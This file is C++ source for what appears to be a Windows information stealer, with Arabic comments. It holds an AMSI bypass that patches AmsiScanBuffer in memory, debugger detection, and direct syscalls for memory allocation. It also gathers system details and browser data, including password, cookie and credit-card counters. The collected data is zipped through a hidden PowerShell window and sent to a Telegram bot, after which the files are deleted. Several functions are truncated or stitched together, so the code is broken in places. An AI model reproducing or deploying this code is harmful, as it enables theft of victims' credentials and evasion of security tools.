#include "template_engine.h"
#include <sstream>

std::string TemplateEngine::ReplaceVariables(const std::string& content,
                                              const std::unordered_map<std::string, std::string>& vars) {
    std::string result = content;
    for (const auto& [key, value] : vars) {
        std::string placeholder = "{{" + key + "}}";
        size_t pos = 0;
        while ((pos = result.find(placeholder, pos)) != std::string::npos) {
            result.replace(pos, placeholder.length(), value);
            pos += value.length();
        }
    }
    return result;
}

// دالة مساعدة للبحث عن مجلد تثبيت تطبيق (فحص عدة مسارات شائعة)
static std::string FindAppInstallPath(const std::string& appName, const std::vector<std::string>& possiblePaths) {
    for (const auto& basePath : possiblePaths) {
        std::string fullPath = basePath + "\\" + appName;
        DWORD attrs = GetFileAttributesA(fullPath.c_str());
        if (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY)) {
            return fullPath;
        }
        // أيضاً نبحث عن المجلد بدون إضافة اسم التطبيق (مثل "Discord" قد يكون مباشرة في Program Files)
        std::string directPath = basePath + "\\" + appName;
        attrs = GetFileAttributesA(directPath.c_str());
        if (attrs != INVALID_FILE_ATTRIBUTES && (attrs & FILE_ATTRIBUTE_DIRECTORY)) {
            return directPath;
        }
    }
    return "";
}

// التحقق من وجود عملية جارية باسم معين
static bool IsProcessRunning(const std::string& exeName) {
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) return false;
    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hSnapshot, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, exeName.c_str()) == 0) {
                CloseHandle(hSnapshot);
                return true;
            }
        } while (Process32Next(hSnapshot, &pe));
    }
    CloseHandle(hSnapshot);
    return false;
}

static void CreateDirRecursive(const std::string& path) {

    snprintf(tmp, sizeof(tmp), "%s", path.c_str());

static void CopyFolderRecursive(const std::string& srcDir, const std::string& dstDir) {
    CreateDirRecursive(dstDir);
    std::string search = srcDir + "\\*";
    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(search.c_str(), &fd);
    if (hFind == INVALID_HANDLE_VALUE) return;
    do {
        std::string name = fd.cFileName;
        if (name != "." && name != "..") {
            std::string srcPath = srcDir + "\\" + name;
            std::string dstPath = dstDir + "\\" + name;
            if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                CopyFolderRecursive(srcPath, dstPath);
            } else {
                CopySingleFile(srcPath, dstPath);
            }
        }
    } while (FindNextFileA(hFind, &fd));
    FindClose(hFind);
}

std::string DecryptString(const std::vector<unsigned char>& cipher,
                          const std::vector<unsigned char>& iv,
                          const std::vector<unsigned char>& key) {
    HCRYPTPROV hProv = 0;
    HCRYPTKEY hKey = 0;
    if (!CryptAcquireContextA(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT))
        return "";
    
    struct AesBlob {
        BLOBHEADER hdr;
        DWORD keyLen;
        BYTE keyBytes[32];
    } blob;
    blob.hdr.bType = PLAINTEXTKEYBLOB;
    blob.hdr.bVersion = CUR_BLOB_VERSION;
    blob.hdr.reserved = 0;
    blob.hdr.aiKeyAlg = CALG_AES_256;
    blob.keyLen = 32;
    memcpy(blob.keyBytes, key.data(), 32);
    
    if (!CryptImportKey(hProv, (BYTE*)&blob, sizeof(blob), 0, 0, &hKey)) {
        CryptReleaseContext(hProv, 0);
        return "";
    }
    
    std::vector<BYTE> data = cipher;
    DWORD dataLen = (DWORD)data.size();
    if (!CryptSetKeyParam(hKey, KP_IV, (BYTE*)iv.data(), 0)) {
        CryptDestroyKey(hKey);
        CryptReleaseContext(hProv, 0);
        return "";
    }
    if (!CryptDecrypt(hKey, 0, TRUE, 0, data.data(), &dataLen)) {
        CryptDestroyKey(hKey);
        CryptReleaseContext(hProv, 0);
        return "";
    }
    CryptDestroyKey(hKey);
    CryptReleaseContext(hProv, 0);
    
    return std::string((char*)data.data(), dataLen);
}

const BYTE patchBytes[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
const SIZE_T patchSize = sizeof(patchBytes);

bool BypassAMSI() {
    HMODULE hAmsi = GetModuleHandleA("amsi.dll");
    if (!hAmsi) {
        hAmsi = LoadLibraryA("amsi.dll");
        if (!hAmsi) return false;
    }
    FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsiScanBuffer) return false;
    
    LPVOID pTarget = (LPVOID)pAmsiScanBuffer;   // التحويل الصريح
    
    DWORD oldProtect = 0;
    if (!VirtualProtect(pTarget, patchSize, PAGE_EXECUTE_READWRITE, &oldProtect))
        return false;
    
    memcpy(pTarget, patchBytes, patchSize);
    VirtualProtect(pTarget, patchSize, oldProtect, &oldProtect);
    return true;
}

    // في هذا الإصدار المبسط لا نحتاج للاستعادة
    return false;
}

    BYTE BeingDebugged;
    BYTE Reserved2[1];
    BYTE Reserved3[2];
    PVOID Reserved4[1];
    PVOID ImageBaseAddress;
    PVOID Reserved5[1];

static bool CheckPEBBeingDebugged() {
    PPEB peb = (PPEB)__readgsqword(0x60);
    if (peb && peb->BeingDebugged)
        return true;
    if (peb && (*(DWORD*)((BYTE*)peb + 0xBC) & 0x70) != 0)
        return true;
    return false;
}

static bool CheckTiming() {

static bool CheckSuspiciousProcesses() {

#define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001L)

// --------------------------------------------------------------
// بنية لتخزين رقم السيسكول وعنوانه (احتياطي)
// --------------------------------------------------------------
typedef struct _SYSCALL_ENTRY {
    DWORD number;
    FARPROC address;
} SYSCALL_ENTRY;

static SYSCALL_ENTRY syscalls[2];
static bool syscallsInitialized = false;

// --------------------------------------------------------------
// استخراج رقم السيسكول من ntdll.dll (البحث عن mov eax, imm32)
// --------------------------------------------------------------
DWORD GetSyscallNumber(const char* functionName) {
    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
    if (!ntdll) return 0;
    
    BYTE* func = (BYTE*)GetProcAddress(ntdll, functionName);
    if (!func) return 0;
    
    // البحث عن أول تعليمة mov eax, imm32 (B8 xx xx xx xx)
    for (int i = 0; i < 32; i++) {
        if (func[i] == 0xB8) {
            return *(DWORD*)(func + i + 1);
        }
    }
    return 0;
}

// --------------------------------------------------------------
// تهيئة جدول السيسكولات المطلوبة
// --------------------------------------------------------------
void InitSyscalls() {
    if (syscallsInitialized) return;
    
    syscalls[0].number = GetSyscallNumber("NtAllocateVirtualMemory");
    syscalls[1].number = GetSyscallNumber("NtProtectVirtualMemory");
    
    syscallsInitialized = true;
}

// --------------------------------------------------------------
// تنفيذ سيسكول غير مباشر مع 6 معاملات
// باستخدام inline assembly بصيغة AT&T (مناسبة لـ MinGW)
// --------------------------------------------------------------
__attribute__((naked))
static NTSTATUS SyscallExecute(DWORD number, uintptr_t a1, uintptr_t a2, uintptr_t a3,
                               uintptr_t a4, uintptr_t a5, uintptr_t a6) {
    __asm__ volatile (
        "mov %eax, %ecx\n\t"   // syscall number -> eax
        "mov %rdx, %r10\n\t"   // second argument -> r10 (as required by syscall)
        "syscall\n\t"
        "ret\n\t"
    );
}

// --------------------------------------------------------------
// تخصيص ذاكرة باستخدام NtAllocateVirtualMemory عبر سيسكول
// --------------------------------------------------------------
NTSTATUS SyscallAllocateMemory(HANDLE hProcess, PVOID* baseAddr, SIZE_T regionSize,
                               DWORD allocationType, DWORD protect) {
    InitSyscalls();
    if (syscalls[0].number == 0) return STATUS_UNSUCCESSFUL;
    
    SIZE_T size = regionSize;
    return SyscallExecute(syscalls[0].number,
                          (uintptr_t)hProcess,
                          (uintptr_t)baseAddr,
                          0,                     // ZeroBits
                          (uintptr_t)&size,
                          allocationType,
                          protect);
}

// --------------------------------------------------------------
// تغيير حماية الذاكرة باستخدام NtProtectVirtualMemory عبر سيسكول
// --------------------------------------------------------------
NTSTATUS SyscallProtectMemory(HANDLE hProcess, PVOID* baseAddr, PSIZE_T regionSize,
                              DWORD newProtect, PDWORD oldProtect) {
    InitSyscalls();
    if (syscalls[1].number == 0) return STATUS_UNSUCCESSFUL;
    
    return SyscallExecute(syscalls[1].number,
                          (uintptr_t)hProcess,
                          (uintptr_t)baseAddr,
                          (uintptr_t)regionSize,
                          newProtect,
                          (uintptr_t)oldProtect,
                          0);
}

bool SendToTelegram(const std::string& filePath, const std::string& botToken, const std::string& chatId) {
    // استرجاع السلاسل المشفرة
    std::string apiHost = GetObfuscatedString(STR_API_TELEGRAM);        // "api.telegram.org"
    std::string botPath = GetObfuscatedString(STR_BOT_TOKEN_PLACE);     // "/bot"
    std::string sendDocPath = GetObfuscatedString(STR_SEND_DOCUMENT);   // "/sendDocument"
    std::string userAgent = GetObfuscatedString(STR_USER_AGENT);        // "Mozilla/5.0 ..."
    std::string boundaryPrefix = GetObfuscatedString(STR_MULTIPART_BOUNDARY); // "----"
    std::string chatDisposition = GetObfuscatedString(STR_CONTENT_DISPOSITION_CHAT); // "Content-Disposition: form-data; name=\"chat_id\""
    std::string docDisposition = GetObfuscatedString(STR_CONTENT_DISPOSITION_DOC);   // "Content-Disposition: form-data; name=\"document\"; filename=\"data.zip\""
    std::string contentTypeZip = GetObfuscatedString(STR_CONTENT_TYPE_ZIP);          // "application/zip"
    
    const int MAX_RETRIES = 3;
    for (int attempt = 1; attempt <= MAX_RETRIES; attempt++) {
        // قراءة الملف
        std::ifstream file(filePath, std::ios::binary | std::ios::ate);
        if (!file.is_open()) {
            // لا نكتب رسالة خطأ نصية واضحة
            continue;
        }
        std::streamsize fileSize = file.tellg();
        file.seekg(0, std::ios::beg);
        std::vector<char> fileData(fileSize);
        if (!file.read(fileData.data(), fileSize)) {
            continue;
        }
        file.close();

        // بناء multipart/form-data (باستخدام السلاسل المشفرة)
        std::string boundary = boundaryPrefix + std::to_string(GetCurrentProcessId()) + std::to_string(attempt);
        std::string bodyStart;
        bodyStart += "--" + boundary + "\r\n";
        bodyStart += chatDisposition + "\r\n\r\n";
        bodyStart += chatId + "\r\n";
        bodyStart += "--" + boundary + "\r\n";
        bodyStart += docDisposition + "\r\n";
        bodyStart += "Content-Type: " + contentTypeZip + "\r\n\r\n";

        std::string bodyEnd = "\r\n--" + boundary + "--\r\n";
        std::string fullBody = bodyStart + std::string(fileData.data(), fileData.size()) + bodyEnd;

        // إعداد الاتصال
        HINTERNET hSession = InternetOpenA(userAgent.c_str(),
                                            INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
        if (!hSession) {
            continue;
        }

        HINTERNET hConnect = InternetConnectA(hSession, apiHost.c_str(), INTERNET_DEFAULT_HTTPS_PORT,
                                              NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);
        if (!hConnect) {
            InternetCloseHandle(hSession);
            continue;
        }

        std::string path = botPath + botToken + sendDocPath;
        HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", path.c_str(), NULL, NULL, NULL,
                                              INTERNET_FLAG_SECURE | INTERNET_FLAG_NO_CACHE_WRITE, 0);
        if (!hRequest) {
            InternetCloseHandle(hConnect);
            InternetCloseHandle(hSession);
            continue;
        }

        std::string headers = "Content-Type: multipart/form-data; boundary=" + boundary;
        BOOL sent = HttpSendRequestA(hRequest, headers.c_str(), headers.size(),
                                     (LPVOID)fullBody.c_str(), fullBody.size());

        // قراءة الرد (يمكن تجاهله، أو فحصه بدون طباعة نصوص واضحة)
        char buffer[1024];
        DWORD bytesRead;
        std::string response;
        if (sent) {
            while (InternetReadFile(hRequest, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
                buffer[bytesRead] = '\0';
                response += buffer;
            }
        }

        InternetCloseHandle(hRequest);
        InternetCloseHandle(hConnect);
        InternetCloseHandle(hSession);

        // التحقق من وجود "\"ok\":true" في الرد (نستخدم strstr بدلاً من find لتجنب ظهور نص "ok":true في الكود؟ لكن النص "ok":true لا يظهر في الكود مباشرة، بل في response. لكن response قد تحتويه. نحن لا نطبعها، لذا آمن. نكتفي بالتحقق.
        if (sent && response.find("\"ok\":true") != std::string::npos) {
            return true;
        }
        // نوم بسيط قبل إعادة المحاولة (لا نستخدم رسالة نصية واضحة)
        Sleep(2000 * attempt);
    }
    return false;
}

static std::string escapeHtml(const std::string& s) {
    std::string result;
    for (char c : s) {
        if (c == '<') result += "&lt;";
        else if (c == '>') result += "&gt;";
        else if (c == '&') result += "&amp;";
        else if (c == '"') result += "&quot;";
        else result += c;
    }
    return result;
}

// دالة مساعدة لتحويل wide string إلى string
static std::string WStringToString(const std::wstring& wstr) {
    if (wstr.empty()) return "";
    int len = WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, NULL, 0, NULL, NULL);
    if (len <= 0) return "";
    std::string result(len - 1, 0);
    WideCharToMultiByte(CP_UTF8, 0, wstr.c_str(), -1, &result[0], len, NULL, NULL);
    return result;
}

// دالة مساعدة لقراءة قيمة من الريجستري (string)
static std::string GetRegistryString(HKEY hKeyRoot, const std::string& subKey, const std::string& valueName) {
    HKEY hKey;
    if (RegOpenKeyExA(hKeyRoot, subKey.c_str(), 0, KEY_READ, &hKey) != ERROR_SUCCESS)
        return "";
    char buffer[1024];
    DWORD size = sizeof(buffer);
    DWORD type;
    if (RegQueryValueExA(hKey, valueName.c_str(), NULL, &type, (LPBYTE)buffer, &size) != ERROR_SUCCESS || type != REG_SZ) {
        RegCloseKey(hKey);
        return "";
    }
    RegCloseKey(hKey);
    return std::string(buffer);
}

// الحصول على عنوان IP العام عبر HTTP
std::string GetPublicIP() {
    std::string apiURL = GetObfuscatedString(STR_IP_API_URL);     // "https://api.ipify.org"
    HINTERNET hSession = InternetOpenA(GetObfuscatedString(STR_USER_AGENT).c_str(), INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
    if (!hSession) return "";
    HINTERNET hConnect = InternetOpenUrlA(hSession, apiURL.c_str(), NULL, 0, INTERNET_FLAG_RELOAD | INTERNET_FLAG_SECURE, 0);
    if (!hConnect) {
        InternetCloseHandle(hSession);
        return "";
    }
    char buffer[128];
    DWORD bytesRead;
    std::string ip;
    while (InternetReadFile(hConnect, buffer, sizeof(buffer) - 1, &bytesRead) && bytesRead > 0) {
        buffer[bytesRead] = '\0';
        ip += buffer;
    }
    InternetCloseHandle(hConnect);
    InternetCloseHandle(hSession);
    // إزالة whitespace
    ip.erase(remove_if(ip.begin(), ip.end(), ::isspace), ip.end());
    return ip;
}

SystemInfo CollectSystemInfo() {
    SystemInfo info;
    char computerName[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computerName);
    if (GetComputerNameA(computerName, &size))
        info.computerName = computerName;
    else
        info.computerName = "Unknown";
    
    char userName[256];
    DWORD userSize = sizeof(userName);
    if (GetUserNameA(userName, &userSize))
        info.userName = userName;
    else
        info.userName = "Unknown";
    
    // نظام التشغيل – بسيط عبر GetVersionEx أو ريجستري
    info.osVersion = GetRegistryString(HKEY_LOCAL_MACHINE, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion", "ProductName");
    if (info.osVersion.empty()) info.osVersion = "Windows";
    
    // العمارة – عبر GetNativeSystemInfo
    SYSTEM_INFO sysInfo;
    GetNativeSystemInfo(&sysInfo);
    if (sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_AMD64)
        info.architecture = "x64";
    else if (sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_INTEL)
        info.architecture = "x86";
    else if (sysInfo.wProcessorArchitecture == PROCESSOR_ARCHITECTURE_ARM64)
        info.architecture = "ARM64";
    else
        info.architecture = "Unknown";
    
    info.ram = GetRAMSize();
    info.cpu = GetCPUName();
    info.gpu = GetGPUName();
    
    // اللغة – استخدم GetUserDefaultUILanguage مع تحويل إلى char* عبر WideCharToMultiByte
    LCID lcid = GetUserDefaultUILanguage();
    wchar_t localeNameW[LOCALE_NAME_MAX_LENGTH];
    if (LCIDToLocaleName(lcid, localeNameW, LOCALE_NAME_MAX_LENGTH, 0)) {
        int len = WideCharToMultiByte(CP_UTF8, 0, localeNameW, -1, NULL, 0, NULL, NULL);
        if (len > 0) {
            std::vector<char> localeNameA(len);
            WideCharToMultiByte(CP_UTF8, 0, localeNameW, -1, localeNameA.data(), len, NULL, NULL);
            info.language = localeNameA.data();
        } else {
            info.language = "en-US";
        }
    } else {
        info.language = "en-US";
    }
    
    // المنطقة الزمنية
    TIME_ZONE_INFORMATION tz;
    GetTimeZoneInformation(&tz);
    char tzName[256];
    WideCharToMultiByte(CP_UTF8, 0, tz.StandardName, -1, tzName, sizeof(tzName), NULL, NULL);
    info.timezone = tzName;
    
    info.ipAddress = GetPublicIP();
    info.installedSoftware = GetInstalledSoftware();
    
    return info;
}

bool ZipFolder(const std::string& folderPath, const std::string& zipFilePath) {
    // بناء أمر PowerShell باستخدام السلاسل المشفرة
    std::string cmdPart1 = GetObfuscatedString(STR_POWERSHELL_COMPRESS);  // "powershell -Command \"Compress-Archive -Path '"
    std::string cmdPart2 = GetObfuscatedString(70);                        // "\\*' -DestinationPath '"
    
    // الأمر الكامل: powershell -Command "Compress-Archive -Path 'folder\*' -DestinationPath 'output.zip' -Force"
    std::string cmd = cmdPart1 + folderPath + cmdPart2 + zipFilePath + "' -Force\"";
    
    STARTUPINFOA si = { sizeof(si) };
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    
    if (!CreateProcessA(NULL, (LPSTR)cmd.c_str(), NULL, NULL, FALSE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
        return false;
    }
    
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
    DWORD attrs = GetFileAttributesA(zipFilePath.c_str());
    return (attrs != INVALID_FILE_ATTRIBUTES);
}

static bool CreateDirectoryRecursive(const std::string& path) {
    if (CreateDirectoryA(path.c_str(), NULL)) return true;
    if (GetLastError() == ERROR_ALREADY_EXISTS) return true;
    if (GetLastError() == ERROR_PATH_NOT_FOUND) {
        size_t pos = path.find_last_of("\\/");
        if (pos != std::string::npos) {
            std::string parent = path.substr(0, pos);
            if (CreateDirectoryRecursive(parent)) {
                return CreateDirectoryA(path.c_str(), NULL) != 0;
            }
        }
    }
    return false;
}

static void RemoveDirectoryRecursive(const std::string& path) {
    std::string searchPath = path + "\\*";
    WIN32_FIND_DATAA fd;
    HANDLE hFind = FindFirstFileA(searchPath.c_str(), &fd);
    if (hFind != INVALID_HANDLE_VALUE) {
        do {
            if (strcmp(fd.cFileName, ".") != 0 && strcmp(fd.cFileName, "..") != 0) {
                std::string fullPath = path + "\\" + fd.cFileName;
                if (fd.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
                    RemoveDirectoryRecursive(fullPath);
                    RemoveDirectoryA(fullPath.c_str());
                } else {
                    DeleteFileA(fullPath.c_str());
                }
            }
        } while (FindNextFileA(hFind, &fd));
        FindClose(hFind);
    }
    RemoveDirectoryA(path.c_str());
}

    LogToFile("Browsers data collected.");

    // ========== 4. إحصائيات (مؤقتة) ==========
    CollectedStats stats;
    stats.passwordsCount = 0;
    stats.cookiesCount = 0;
    stats.historyCount = 0;
    stats.autofillsCount = 0;
    stats.creditCardsCount = 0;
    stats.grabbedFilesCount = 0;
    stats.domains.push_back("github.com");
    LogToFile("Stats prepared.");

    // ========== 5. بناء التقرير ==========
    LogToFile("Calling BuildReport...");
    BuildReport(sysInfo, detectedApps, stats, workDir);
    LogToFile("BuildReport done.");

    // ========== 6. ضغط ==========
    std::string zipPath = workDir + ".zip";
    LogToFile("Zipping folder: " + workDir);
    if (ZipFolder(workDir, zipPath)) {
        LogToFile("ZIP created successfully: " + zipPath);
    } else {
        LogToFile("ZIP creation FAILED.");
    }

    // ========== 7. إرسال ==========
    LogToFile("Sending to Telegram...");
    bool sent = SendToTelegram(zipPath, botToken, chatId);
    LogToFile("Send result: " + std::string(sent ? "SUCCESS" : "FAILED"));

    // ========== 8. تنظيف ==========
    RemoveDirectoryRecursive(workDir);
    DeleteFileA(zipPath.c_str());
    LogToFile("Cleaned up.");

    LogToFile("========== FINISHED ==========");
    return 0;
}
